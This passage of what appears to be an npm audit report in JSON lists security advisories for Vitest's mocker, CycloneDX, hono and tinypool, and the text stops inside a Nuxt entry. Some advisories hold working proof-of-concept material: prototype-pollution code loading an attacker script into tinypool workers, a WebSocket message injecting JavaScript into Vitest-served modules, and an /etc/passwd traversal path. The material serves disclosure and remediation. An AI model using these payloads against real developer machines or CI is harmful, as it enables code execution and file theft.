+      "overview": "## Summary\n`@vitest/mocker` registers a redirect mock's target path without validating it\nagainst the dev server's file-serving allowlist. An attacker who can reach the\ndev server's WebSocket can register a redirect mock pointing outside the project\nroot; when the mocked module is requested, the plugin's `load` hook returns\n`readFile(<attacker path>)` as the module source, disclosing local files.\n\nThis is exploitable **without authentication** only through the public\n`mockerPlugin` / standalone `interceptorPlugin` exports (used by third-party dev\nservers), which register the handler on Vite's unauthenticated HMR socket.\nVitest's own browser mode registers mocks over a **token-authenticated** RPC and\nis not remotely reachable by default (see Scope).\n\n## Affected code\n`packages/mocker/src/node/interceptorPlugin.ts`.\n\nThe `load` hook is the file-read sink:\n\n```ts\nif (mock.type === 'redirect') {\n  return readFile(mock.redirect, 'utf-8')\n}\n```\n\n`mock.redirect` is derived from client input at registration time with no\nboundary check:\n\n```ts\nif (event.type === 'redirect') {\n  const redirectUrl = new URL(event.redirect)\n  event.redirect = join(server.config.root, redirectUrl.pathname)\n}\nregistry.register(event)\n```\n\nThere is no `server.fs.allow` / `server.fs.deny` check and no assertion that the\nresolved path stays within the project root.\n\n## Registration paths and trust boundaries\n- **Public `mockerPlugin` / `interceptorPlugin` (unauthenticated).** In\n  `configureServer`, the plugin registers `server.ws.on('vitest:interceptor:register', ???)`\n  on Vite's HMR WebSocket. That socket performs no token, Origin, or same-origin\n  check, so any client that can reach it can register a redirect mock. This is\n  the path the \"unauthenticated\" impact applies to.\n- **Vitest browser mode (authenticated).** Mocks register over the browser RPC\n  (`registerMock`), which sits behind a per-run token (`isValidApiRequest`, a\n  random `api.token`). The interceptor's `configureServer` socket is not used for\n  registration here (in v5 it does not run at all, as the plugin is injected per\n  environment). The same missing boundary check exists on the authenticated RPC\n  path, but reaching it requires the token, so it is not a remote-unauthenticated\n  read.\n\n## Path handling\n`new URL(redirect).pathname` combined with `join(root, pathname)` does **not**\nconfine reads to the root:\n\n- Special/hierarchical schemes (`file:`, `http:`) are normalized by WHATWG URL,\n  so `..` segments are collapsed and the result stays under the root. Payloads of\n  the form `file:///../../etc/passwd` do **not** escape.\n- A non-special (opaque) scheme preserves `..` in `pathname`, so\n  `join(root, \"../../???/etc/passwd\")` resolves outside the root and reads an\n  arbitrary file.\n\nEven without escaping the root, the missing `server.fs` check allows reading any\nin-root file the dev server would otherwise refuse to serve (for example an\nin-root `.env` or source that is denied by `server.fs.deny`).\n\n## Scope / preconditions\n- This is a **development-server** issue. The dev server binds to `localhost` by\n  default and is not reachable from the network unless the developer exposes it\n  (`server.host` / `0.0.0.0`, a LAN bind, or a proxy).\n- A raw (non-browser) client against a reachable server bypasses browser origin\n  and CORS protections entirely and can both register the mock and read the\n  response.\n- A browser-based drive-by against a localhost server is substantially mitigated\n  by Vite defaults: the default CORS origin allowlist is limited to `localhost`\n  origins, and `server.allowedHosts` blocks DNS-rebinding, so a cross-origin page\n  cannot read the file contents back.\n\n## Impact\nDisclosure of local files readable by the dev-server process (source, in-root\n`.env`/secrets, and, via the opaque-scheme payload, files outside the project\nroot). No integrity or availability impact.\n\n## Affected versions\nPresent since `@vitest/mocker` was introduced.\n\n- **Affected: `@vitest/mocker` >= 2.1.0** (shipped in `vitest` and\n  `@vitest/browser` >= 2.1.0), through 4.1.x and the 5.0.0 pre-releases.\n- **Fixed:** Vitest 4.1.11 and 5.0.0. Older majors (2.1.x, 3.x) are not\n  maintained and are not planned to receive the fix.\n\n## Fix\nValidate the resolved redirect target against Vite's file-serving allowlist\n(`isFileLoadingAllowed`) before registering it, at every registration site, and\nstop registering the interceptor WebSocket events in Vitest's browser mode\n(mocks there flow through the authenticated RPC).",
+      "reported_by": null,
+      "title": "Vitest: Path Traversal / Arbitrary File Read via @vitest/mocker Redirect Mock",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-84373"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0 <4.1.11",
+      "github_advisory_id": "GHSA-82fw-gwwq-j7x9",
+      "recommendation": "Upgrade to version 4.1.11 or later",
+      "patched_versions": ">=4.1.11",
+      "updated": "2026-09-08T20:46:47.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-82fw-gwwq-j7x9"
+    },
+    "1224698": {
+      "findings": [
+        {
+          "version": "4.2.1",
+          "paths": [
+            ".>@cyclonedx/cyclonedx-npm"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/CycloneDX/cyclonedx-node-npm/security/advisories/GHSA-q69g-4hcv-6jg4\n- https://github.com/CycloneDX/cyclonedx-node-npm/pull/1489\n- https://github.com/CycloneDX/cyclonedx-node-npm/commit/15d3beb5bcd2b0b6eccfdf31192f5103b3f12c0f\n- https://github.com/CycloneDX/cyclonedx-node-npm/releases/tag/v6.0.0\n- https://github.com/advisories/GHSA-q69g-4hcv-6jg4",
+      "created": "2026-09-17T14:50:40.000Z",
+      "id": 1224698,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA **Windows-specific** command injection vulnerability exists in `@cyclonedx/cyclonedx-npm` when the CLI is invoked with the `--workspace <value>` option.  \nUser-supplied `--workspace` values can be passed to a shell command without proper neutralization on the Windows fallback execution path, enabling attackers to inject arbitrary OS commands.  \n\nThe vulnerability was fixed in version [6.0.0][v6.0.0].\n\n## Vulnerability Details\n\nWhen `cyclonedx-npm` is executed with the `--workspace` option, the provided argument is incorporated into an internal command execution flow.  \nOn **Windows systems**, this path can interpret untrusted `--workspace` input as shell syntax if not safely handled.\n\nAs a result, specially crafted workspace names can break out of the intended command context and execute arbitrary commands with the privileges of the invoking user.\n\n## Impact\n\nAn attacker who can influence the value passed to `--workspace` can execute arbitrary OS commands **on Windows hosts**.  \nThis may lead to:\n\n* Arbitrary command execution\n* Data exfiltration\n* Local privilege escalation (depending on runtime context and privileges)\n* Modification or destruction of files accessible to the user running the CLI\n\nThe vulnerability affects only scenarios where:\n\n* The user invokes `cyclonedx-npm` with `--workspace <value>`, and\n* The vulnerable execution path is reached on **Windows**.\n\n## Exploitation Conditions (High-Level)\n\nExploitation requires the attacker to supply or influence the `--workspace` value passed to the CLI.  \nIf the tool falls back to the vulnerable shell execution path on **Windows**, specially crafted workspace identifiers can cause unintended command execution.  \nNo exploit code is included here to avoid providing weaponizable examples.\n\n## Root Cause\n\nThe CLI fallback execution path on **Windows** constructed a shell command using untrusted input from the `--workspace` option.  \nBecause the fallback code path does not sanitize or escape the workspace value, special shell metacharacters (e.g., `>`, `&`, `|`) are interpreted by the shell, enabling command injection.\n\n## Fix\n\nThe vulnerability was resolved in [PR #1489], which ensures workspace values are handled safely and are no longer passed to a vulnerable shell execution path.\n\nThe fix is included in `@cyclonedx/cyclonedx-npm` version [6.0.0][v6.0.0].\n\n## Remediation\n\n* Upgrade to version [6.0.0][v6.0.0] or later, which contains the complete fix.\n* As a temporary mitigation for older versions, ensure that the environment variable `npm_execpath` is set to a `npm-cli.js` before invoking the tool.\n* Avoid passing untrusted or user-controlled values to the `--workspace` option.\n* If immediate upgrade is not possible, prioritize mitigation on **Windows systems**, where exploitability exists.",
+      "reported_by": null,
+      "title": "@cyclonedx/cyclonedx-npm: Shell Injection via Unsanitized --workspace Argument on Windows",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-71538"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@cyclonedx/cyclonedx-npm",
+      "vulnerable_versions": "<6.0.0",
+      "github_advisory_id": "GHSA-q69g-4hcv-6jg4",
+      "recommendation": "Upgrade to version 6.0.0 or later",
+      "patched_versions": ">=6.0.0",
+      "updated": "2026-09-17T14:50:42.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-q69g-4hcv-6jg4"
+    },
+    "1240640": {
+      "findings": [
+        {
+          "version": "4.13.5",
+          "paths": [
+            "apps__api>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-hxh3-vqpv-xpqv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-93981\n- https://github.com/honojs/hono/commit/2b8ed402cdab6dfc5e829b480806dcd8db94161e\n- https://github.com/honojs/hono/releases/tag/v4.13.7\n- https://www.vulncheck.com/advisories/hono-jsx-before-4.13.7-cross-site-scripting-via-unescaped-strings\n- https://github.com/advisories/GHSA-hxh3-vqpv-xpqv",
+      "created": "2026-09-30T23:46:16.000Z",
+      "id": 1240640,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`hono/jsx` does not HTML-escape a plain string placed directly as a child or `fallback` of `Suspense` or `ErrorBoundary`, as the only child of a `Context.Provider`, or as the root value of `renderToString()` / `renderToReadableStream()` from `hono/jsx/dom/server`. Such a string is emitted as markup instead of text.\n\n### Details\n\nThese paths stringify their input and treat the result as already-escaped HTML, so a plain string passes through unchanged. Notable cases:\n\n- `Suspense`: a string child, or a string `fallback` while a child suspends. With streaming, the fallback reaches the browser in the initial chunk.\n- `ErrorBoundary`: a string child alongside an asynchronous sibling. The all-synchronous case was fixed in 4.11.7 (GHSA-9r54-q6cx-xmh5).\n- `Context.Provider`: a single string child. Multiple children are escaped.\n- `hono/jsx/dom/server`: a string, or an array containing strings, passed as the root.\n\nA lone `{children}` forwarded by a wrapper component is enough to reach these paths. Strings wrapped in an element, values from `raw()` or the `html` helper, and client-side rendering with `hono/jsx/dom` are not affected.\n\n### Impact\n\nAn attacker who controls a string rendered in an affected position can inject arbitrary HTML into the server-rendered page, leading to cross-site scripting under the application's origin.\n\nThis issue affects applications that render untrusted strings directly in one of the positions above during server-side rendering.",
+      "reported_by": null,
+      "title": "hono/jsx renders plain strings unescaped in boundary components, leading to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-93981"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": "<4.13.7",
+      "github_advisory_id": "GHSA-hxh3-vqpv-xpqv",
+      "recommendation": "Upgrade to version 4.13.7 or later",
+      "patched_versions": ">=4.13.7",
+      "updated": "2026-09-30T23:46:17.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-hxh3-vqpv-xpqv"
+    },
+    "1241260": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ".>vitest>tinypool"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/tinylibs/tinypool/security/advisories/GHSA-5gmw-xhrv-c9v3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104848\n- https://github.com/tinylibs/tinypool/pull/134\n- https://github.com/tinylibs/tinypool/commit/24df4e730e7d0857a6d226c9b58f8924227404fd\n- https://github.com/tinylibs/tinypool/releases/tag/v2.1.1\n- https://github.com/advisories/GHSA-5gmw-xhrv-c9v3",
+      "created": "2026-10-05T22:50:01.000Z",
+      "id": 1241260,
+      "npm_advisory_id": null,
+      "overview": "`tinypool` passes worker options to `new Worker()` by reading them off a plain object whose prototype is `Object.prototype`. Options the application did not set are resolved through the prototype chain and then passed explicitly to `worker_threads.Worker`.\n\nNode core ignores `Worker` options inherited from `Object.prototype`. By reading them and passing them explicitly, tinypool re-materialises them as own properties and defeats that protection.\n\n\nTwo keys reach code execution:\n\n1. **`execArgv`** ??? polluting `Object.prototype.execArgv = ['--require', '/path/to/attacker.js']` causes every pool worker to load the attacker's script.\n2. **`env`** ??? polluting `Object.prototype.env = { NODE_OPTIONS: '--require /path/to/attacker.js' }` achieves the same via environment injection.\n\n## Root cause\n\n`dist/index.js` lines 508-511:\n\n```js\nenv:            this.options.env,\nargv:           this.options.argv,\nexecArgv:       this.options.execArgv,\nresourceLimits: this.options.resourceLimits,\n```\n\n`this.options` is built at line 470 via object spread:\n\n```js\nthis.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };\n```\n\n## Impact\n\nArbitrary code execution inside every worker the pool spawns, with the privileges of the host process. Because tinypool is the worker pool behind Vitest (~42M downloads/week), the natural blast radius is developer machines and CI runners ??? an attacker who lands a prototype-pollution primitive anywhere in the dependency tree gets code execution in the build/test pipeline, which is a supply-chain foothold (access to CI secrets, signing keys, artifact publishing).\n\n\n## Proof of concept\n\nMinimal reproduction (3 files):\n\n**worker.mjs** ??? the application's own legitimate worker:\n```js\nexport default function double(n) { return n * 2 }\n```\n\n**payload.js** ??? attacker-controlled code (never referenced by the app):\n```js\nconst fs = require('fs')\nfs.writeFileSync('/tmp/RCE_PROOF.txt', 'code execution achieved, pid=' + process.pid)\nconsole.log('*** RCE ***')\n```\n\n**app.js** ??? normal tinypool usage:\n```js\nconst path = require('path')\n\n// Simulates an upstream PP source (lodash/qs/minimist/set-value/deepmerge)\nObject.prototype.execArgv = ['--require', path.join(__dirname, 'payload.js')]\n\nconst { Tinypool } = require('tinypool')\nconst pool = new Tinypool({\n  filename: path.join(__dirname, 'worker.mjs'),\n  minThreads: 1, maxThreads: 1\n})\npool.run(21).then(r => {\n  console.log('pool returned:', r)  // 42 ??? app works normally\n  pool.destroy()\n})\n```\n\nRun:\n```\nnpm i tinypool@2.1.0\nnode app.js\ncat /tmp/RCE_PROOF.txt   # attacker's code ran\n```\n\nBoth `execArgv` and `env` vectors confirmed on Node 20.\n\n\n## Suggested fix\n\nResolve worker options with own-property semantics:\n\n```js\nthis.options = Object.assign(Object.create(null),\n  kDefaultOptions, options, { filename, maxQueue: 0 });\n```",
+      "reported_by": null,
+      "title": "Tinypool: Prototype Pollution gadget in worker options leads to Remote Code Execution",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104848"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tinypool",
+      "vulnerable_versions": "<=2.1.0",
+      "github_advisory_id": "GHSA-5gmw-xhrv-c9v3",
+      "recommendation": "Upgrade to version 2.1.1 or later",
+      "patched_versions": ">=2.1.1",
+      "updated": "2026-10-05T22:50:02.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-5gmw-xhrv-c9v3"
+    },
+    "1241261": {
+      "findings": [
+        {
+          "version": "1.1.1",
+          "paths": [
+            ".>vitest>tinypool"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/tinylibs/tinypool/security/advisories/GHSA-85c8-ppgw-ccpr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-104849\n- https://github.com/tinylibs/tinypool/pull/135\n- https://github.com/tinylibs/tinypool/commit/f41411a3e23324c674f35a19a3240f7a7c40ffbf\n- https://github.com/tinylibs/tinypool/releases/tag/v2.1.2\n- https://github.com/advisories/GHSA-85c8-ppgw-ccpr",
+      "created": "2026-10-05T22:49:52.000Z",
+      "id": 1241261,
+      "npm_advisory_id": null,
+      "overview": "`tinypool` is a fork of `piscina` and inherited the same prototype-pollution surface. When `pool.run(task, options)` is called, the `filename` option is read from the provided `options` object. If that object does not have an own `filename` property, the lookup falls through to `Object.prototype`.\n\nAn attacker who can pollute `Object.prototype.filename` (for example, via a vulnerable `lodash.merge`, `qs.parse`, or similar elsewhere in the application) can make tinypool load and execute an attacker-controlled worker module.\n\nThis is the tinypool counterpart to the piscina root discovery [GHSA-x9g3-xrwr-cwfg](https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg).\n\n`pool.run(task)` with no second argument is not affected, because `kDefaultOptions.filename` is `null` and the options object is not user-controlled. The exploit only triggers when the caller passes their own options object to `pool.run()`.\n\n## Impact\n\nArbitrary JavaScript execution in the worker pool. If the application passes attacker-controlled data as the `run()` task and also supplies a `run()` options object, the attacker can redirect execution to a malicious worker that exfiltrates or modifies that data, achieving remote code execution and/or data exfiltration.\n\n## Proof of Concept\n\n```js\n// legitimate-worker.mjs\nexport default async (task) => ({ by: 'legitimate-worker', processed: task })\n\n// malicious-worker.mjs\nexport default async (task) => ({ by: 'attacker', stolenRequestBody: task })\n\n// main.js\nimport express from \"express\";\nimport Tinypool from \"tinypool\";\nimport { fileURLToPath } from \"node:url\";\nimport path from \"node:path\";\n\nconst __dirname = path.dirname(fileURLToPath(import.meta.url));\n\n// Simulate upstream prototype pollution (lodash merge, qs parse, etc.)\nObject.prototype.filename = path.join(__dirname, \"malicious-worker.mjs\");\n\nconst pool = new Tinypool({\n  filename: path.join(__dirname, \"legitimate-worker.mjs\"),\n});\n\nexpress()\n  .use(express.json())\n  .post(\"/\", async (req, res) => {\n    const ac = new AbortController();\n    const result = await pool.run(req.body, { signal: ac.signal });\n    res.json(result);\n  })\n  .listen(31337);\n```\n\n## Suggested fix\n\nRead all user-supplied options from own properties only (`Object.hasOwn` or `Object.prototype.hasOwnProperty.call`) and build the internal `ThreadPool.options` object with a null prototype.",
+      "reported_by": null,
+      "title": "Tinypool: Prototype Pollution Gadget to RCE in run() options",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-104849"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "tinypool",
+      "vulnerable_versions": "<2.1.2",
+      "github_advisory_id": "GHSA-85c8-ppgw-ccpr",
+      "recommendation": "Upgrade to version 2.1.2 or later",
+      "patched_versions": ">=2.1.2",
+      "updated": "2026-10-05T22:49:53.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-85c8-ppgw-ccpr"
+    },
+    "1242595": {
+      "findings": [
+        {
+          "version": "4.13.5",
+          "paths": [
+            "apps__api>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-5r4p-p66f-jhc7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111757\n- https://github.com/honojs/hono/commit/8b05c774ef1555c70f5ba5e2991b7e77cc3635cc\n- https://github.com/honojs/hono/releases/tag/v4.13.11\n- https://github.com/advisories/GHSA-5r4p-p66f-jhc7",
+      "created": "2026-10-20T14:36:11.000Z",
+      "id": 1242595,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "Hono: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111757"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": ">=4.12.4 <4.13.11",
+      "github_advisory_id": "GHSA-5r4p-p66f-jhc7",
+      "recommendation": "Upgrade to version 4.13.11 or later",
+      "patched_versions": ">=4.13.11",
+      "updated": "2026-10-20T14:36:13.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-5r4p-p66f-jhc7"
+    },
+    "1242767": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            ".>vitest>@vitest/mocker"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-qxg6-89mg-rqv8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112949\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-qxg6-89mg-rqv8",
+      "created": "2026-10-21T19:54:26.000Z",
+      "id": 1242767,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.\n\nSame handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.\n\n### Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.\n\nProjects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.\n\n### Details\n\n`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:\n\n```ts\nexport function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '\"__vitest_mocker__\"'): string {\n  const source = `\nconst __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule(\"${moduleUrl}\");\n`\n```\n\n`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.\n\n`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:\n\n```ts\nconfigureServer(server) {\n  if (options.registerWebSocketEvents === false) { return }\n  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {\n    if (event.type === 'manual') {\n      const module = ManualMockedModule.fromJSON(event, async () => {\n        const keys = await getFactoryExports(event.url)\n        return Object.fromEntries(keys.map(key => [key, null]))\n      })\n      registry.add(module)                       // no validation of `id` or `url`\n    }\n    else {\n      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }\n```\n\n`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.\n\nWith `url = 'x\"); globalThis.ARES_INJECTED = 1; void(\"'` a request for `/src/app.js` is answered with valid, executable JavaScript:\n\n```js\nconst __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n```\n\n`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too ??? but each name is emitted into `__factoryModule__[\"X\"]`, `export { __0 as \"X\" }` and `resolvedModule[\"X\"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.\n\n**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it ??? the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.\n\n### PoC\n\n`poc/mocker-manual-mock-injection/` ??? `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text ??? the script never evaluates it.\n\nEnvironment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.\n\n```bash\ngit clone https://github.com/vitest-dev/vitest && cd vitest\ngit checkout 9e1166959e14bd32298d8a0e85352431c769ec7a\npnpm install && pnpm build\nREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh\n```\n\nRequired configuration ??? the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):\n\n```ts\nimport { interceptorPlugin } from '@vitest/mocker/node'\nexport default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()\n```\n\nThe attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:\n\n```json\n{ \"type\": \"custom\", \"event\": \"vitest:interceptor:register\",\n  \"data\": { \"type\": \"manual\", \"raw\": \"\", \"id\": \"<abs path of a served module>\",\n            \"url\": \"x\\\"); globalThis.ARES_INJECTED = 1; void(\\\"\" } }\n```\n\nthen answering the server's `vitest:interceptor:resolve` with `{\"type\":\"custom\",\"event\":\"vitest:interceptor:resolved\",\"data\":{\"url\":\"<same url>\",\"keys\":[\"a\"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.\n\nObserved output:\n\n```\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400\nPASS  negative control: with no mock registered the real module is served\nPASS  negative control: a mock with a harmless url replaces the module but injects nothing\n--- module served for /src/app.js ---\n    const __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n\n    let __0 = __factoryModule__[\"a\"]\n    export { __0 as \"a\" }\n    if (__factoryModule__.__factoryPromise != null) {\n      __factoryModule__.__factoryPromise.then((resolvedModule) => {\n        __0 = resolvedModule[\"a\"];\n      })\n    }\nPASS  attacker statement is present in the module the dev server serves\nPASS  the real module body was replaced\nPASS  the injected module parses as JavaScript (Vite import analysis accepted it)\n\nRESULT: VULNERABLE\n```\n\n* **Positive control** ??? with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.\n* **Negative control** ??? the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.\n* **Precondition controls** ??? the two `Origin` probes record the boundary honestly.\n* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with \"content contains invalid JS syntax\"), so acceptance proves the injected module is valid, executable JavaScript.\n\nReproduced three times from a clean `mktemp` fixture, exit 0 each time.\n\n### Impact\n\nCode injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only ??? `configureServer` does not run for `vite build` or `vite preview`.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n\nDisclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.",
+      "reported_by": null,
+      "title": "Vitest: Code injection via unauthenticated manual mock registration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112949"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0-beta.7 <4.1.12",
+      "github_advisory_id": "GHSA-qxg6-89mg-rqv8",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:54:27.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116",
+        "CWE-306"
+      ],
+      "url": "https://github.com/advisories/GHSA-qxg6-89mg-rqv8"
+    },
+    "1242828": {
+      "findings": [
+        {
+          "version": "4.5.2",
+          "paths": [
+            "apps__web>nuxt>@nuxt/nitro-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nuxt/nuxt/security/advisories/GHSA-vjh5-4x84-xrqp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-114132\n- https://github.com/nuxt/nuxt/commit/f6cfee52cf9576ddc4f4ee83b486969328b358f8\n- https://github.com/nuxt/nuxt/releases/tag/v4.6.2\n- https://github.com/advisories/GHSA-vjh5-4x84-xrqp",
+      "created": "2026-10-22T16:59:55.000Z",
+      "id": 1242828,
+      "npm_advisory_id": null,
